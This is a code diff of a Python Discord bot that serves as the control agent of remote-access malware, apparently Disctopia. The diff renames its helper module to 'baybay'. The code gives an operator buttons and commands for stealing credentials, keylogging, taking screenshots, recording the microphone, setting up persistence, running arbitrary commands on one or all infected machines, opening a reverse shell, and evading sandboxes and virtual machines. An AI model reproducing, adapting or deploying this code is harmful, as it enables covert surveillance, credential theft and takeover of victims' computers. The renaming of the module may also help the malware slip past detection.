@@ -8,7 +8,7 @@ import discord
 from discord.ext import commands
 from discord import app_commands
 
-from libraries import keylogger,sandboxevasion,disctopia
+from libraries import baybay, keylogger,sandboxevasion
 
 GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = {CHANNEL}
@@ -27,14 +27,14 @@ class Bot(commands.Bot):
         self.channel = self.get_channel(CHANNEL)
         now = datetime.now()
         my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
-        my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
-        my_embed.add_field(name="**Bits**", value=disctopia.getBits(), inline=True)
-        my_embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
-        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True) 
-        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
-        my_embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
-        my_embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
-        my_embed.add_field(name="**Is VM**", value=disctopia.isVM(), inline=True)
+        my_embed.add_field(name="**IP**", value=baybay.getIP(), inline=True)
+        my_embed.add_field(name="**Bits**", value=baybay.getBits(), inline=True)
+        my_embed.add_field(name="**HostName**", value=baybay.getHostname(), inline=True)
+        my_embed.add_field(name="**OS**", value=baybay.getOS(), inline=True) 
+        my_embed.add_field(name="**Username**", value=baybay.getUsername(), inline=True)
+        my_embed.add_field(name="**CPU**", value=baybay.getCPU(), inline=False)
+        my_embed.add_field(name="**Is Admin**", value=baybay.isAdmin(), inline=True)
+        my_embed.add_field(name="**Is VM**", value=baybay.isVM(), inline=True)
         my_embed.add_field(name="**Auto Keylogger**", value=False, inline=True)
         await self.channel.send(embed=my_embed)
 
@@ -66,7 +66,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Webshot", style=discord.ButtonStyle.gray, emoji="📸")
     async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.webshot()
+        result = baybay.webshot()
         if result != False:
             await interaction.response.send_message(file=discord.File(result))
             os.remove(result)
@@ -76,7 +76,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
     async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.process()
+        result = baybay.process()
         if len(result) > 4000:
             path = os.environ["temp"] +"\\response.txt"         
             with open(path, 'w') as file:
@@ -89,7 +89,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
     async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.screenshot()
+        result = baybay.screenshot()
         if result != False:
             await interaction.response.send_message(file=discord.File(result))
             os.remove(result)
@@ -99,7 +99,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
     async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.creds()
+        result = baybay.creds()
         if result != False:
             await interaction.response.send_message(file=discord.File(result))
             os.remove(result)
@@ -109,7 +109,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Persistent", style=discord.ButtonStyle.gray, emoji="🔁")
     async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.persistent()
+        result = baybay.persistent()
         if result:
             my_embed = discord.Embed(title=f"Persistance enabled on Agent#{self.id}", color=0x00FF00)
         else:
@@ -118,7 +118,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Location", style=discord.ButtonStyle.gray, emoji="🌐")
     async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
-        response = disctopia.location()
+        response = baybay.location()
         if response != False:
             my_embed = discord.Embed(title=f"IP Based Location on Agent#{self.id}", color=0x00FF00)
             my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
@@ -132,7 +132,7 @@ class InteractButton(discord.ui.View):
 
     @discord.ui.button(label="Selfdestruct", style=discord.ButtonStyle.red, emoji="💣")
     async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
-        result = disctopia.selfdestruct()
+        result = baybay.selfdestruct()
         if result:
             my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
         else:
@@ -161,7 +161,7 @@ async def cmd(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def cmd(ctx: commands.Context, command:str):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.cmd(command)
+        result = baybay.cmd(command)
         if len(result) > 2000:
             path = os.environ["temp"] +"\\response.txt"     
             with open(path, 'w') as file:
@@ -175,7 +175,7 @@ async def cmd(ctx: commands.Context, command:str):
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
 @app_commands.guilds(GUILD)
 async def cmd_all(ctx: commands.Context, command:str):
-    result = disctopia.cmd(command)
+    result = baybay.cmd(command)
     if len(result) > 2000:
         path = os.environ["temp"] +"\\response.txt"     
         with open(path, 'w') as file:
@@ -194,7 +194,7 @@ async def webshot(ctx: commands.Context):
             my_embed = discord.Embed(title=f"Please use **!webshot {ID}** instead of the slash command", color=0xFF0000)
             await ctx.reply(embed=my_embed) 
         else:
-            result = disctopia.webshot()
+            result = baybay.webshot()
             if result != False:
                 await ctx.reply(file=discord.File(result))
                 os.remove(result)
@@ -207,7 +207,7 @@ async def webshot(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def cd(ctx: commands.Context, path:str):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.cd(path)
+        result = baybay.cd(path)
         if (result):
             my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
         else:
@@ -219,7 +219,7 @@ async def cd(ctx: commands.Context, path:str):
 @app_commands.guilds(GUILD)
 async def process(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.process()
+        result = baybay.process()
         if len(result) > 4000:
             path = os.environ["temp"] +"\\response.txt"         
             with open(path, 'w') as file:
@@ -234,7 +234,7 @@ async def process(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def upload(ctx: commands.Context, url:str, name:str):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.upload(url, name)
+        result = baybay.upload(url, name)
         if result:
             my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
         else:
@@ -246,7 +246,7 @@ async def upload(ctx: commands.Context, url:str, name:str):
 @app_commands.guilds(GUILD)
 async def screenshot(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.screenshot()
+        result = baybay.screenshot()
         if result != False:
             await ctx.reply(file=discord.File(result))
             os.remove(result)
@@ -259,7 +259,7 @@ async def screenshot(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def creds(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.creds()
+        result = baybay.creds()
         if result != False:
             await ctx.reply(file=discord.File(result))
             os.remove(result)
@@ -272,7 +272,7 @@ async def creds(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def persistent(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.persistent()
+        result = baybay.persistent()
         if result:
             my_embed = discord.Embed(title=f"Persistance enabled on Agent#{ID}", color=0x00FF00)
         else:
@@ -287,9 +287,9 @@ async def ls(ctx: commands.Context):
          my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
          await ctx.reply(embed=my_embed)
     else:
-        my_embed = discord.Embed(title=f"Agent #{ID}   IP: {disctopia.getIP()}", color=0xADD8E6)
-        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
-        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
+        my_embed = discord.Embed(title=f"Agent #{ID}   IP: {baybay.getIP()}", color=0xADD8E6)
+        my_embed.add_field(name="**OS**", value=baybay.getOS(), inline=True)
+        my_embed.add_field(name="**Username**", value=baybay.getUsername(), inline=True)
         view = InteractButton("Interact", ID)
         await ctx.reply(embed=my_embed, view=view)
 
@@ -318,7 +318,7 @@ async def download(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def selfdestruct(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.selfdestruct()
+        result = baybay.selfdestruct()
         if result:
             my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
         else:
@@ -330,7 +330,7 @@ async def selfdestruct(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def location(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
-        response = disctopia.location()
+        response = baybay.location()
         if response != False:
             my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
             my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
@@ -347,7 +347,7 @@ async def location(ctx: commands.Context):
 @app_commands.guilds(GUILD)
 async def location(ctx: commands.Context, ip:str, port:int):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.revshell(ip, port)
+        result = baybay.revshell(ip, port)
         if result:
             my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
@@ -361,7 +361,7 @@ async def recordmic(ctx: commands.Context, seconds:int):
             my_embed = discord.Embed(title=f"Please use **!recordmic {ID}** instead of the slash command", color=0xFF0000)
             await ctx.reply(embed=my_embed)
         else:
-            result = disctopia.recordmic(seconds)
+            result = baybay.recordmic(seconds)
             if result != False:
                 await ctx.reply(file=discord.File(result))
                 os.remove(result)
@@ -374,7 +374,7 @@ async def recordmic(ctx: commands.Context, seconds:int):
 @app_commands.guilds(GUILD)
 async def wallpaper(ctx: commands.Context, path_url:str):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.wallpaper(path_url)
+        result = baybay.wallpaper(path_url)
         if result:
             my_embed = discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00)
         else:
@@ -386,7 +386,7 @@ async def wallpaper(ctx: commands.Context, path_url:str):
 @app_commands.guilds(GUILD)
 async def killproc(ctx: commands.Context, pid:int):
     if (int(CURRENT_AGENT) == int(ID)):
-        result = disctopia.killproc(pid)
+        result = baybay.killproc(pid)
         if result:
             my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
         else:
@@ -437,9 +437,9 @@ async def keylog(ctx: commands.Context):
 
 
 
-if sandboxevasion.test() == True and disctopia.isVM() == False:
-    config = disctopia.createConfig()
-    ID = disctopia.id()
+if sandboxevasion.test() == True and baybay.isVM() == False:
+    config = baybay.createConfig()
+    ID = baybay.id()
     if config:
         MSG = f"New Agent Online #{ID}"
         COLOR = 0x00ff00
